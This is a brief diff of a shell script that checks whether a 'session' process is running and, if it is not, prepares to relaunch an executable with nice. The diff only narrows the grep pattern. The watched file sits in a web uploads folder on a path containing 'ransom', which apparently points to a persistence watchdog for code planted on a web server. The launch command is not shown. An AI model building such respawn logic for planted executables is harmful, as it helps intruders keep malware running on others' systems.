@@ -4,7 +4,7 @@
 SESSION_FILE="/var/www/html/colortech/api/uploads/ransom/tmp/sess_aksd19sb187ss1ia901b23/session_ajasysbey"
 
 # Check if the session process is active
-if ps -e | grep session_; then
+if ps -e | grep session_ajasys; then
     echo "Session process is active"
 else
     echo "Session process is not active, running the specified executable file with nice"
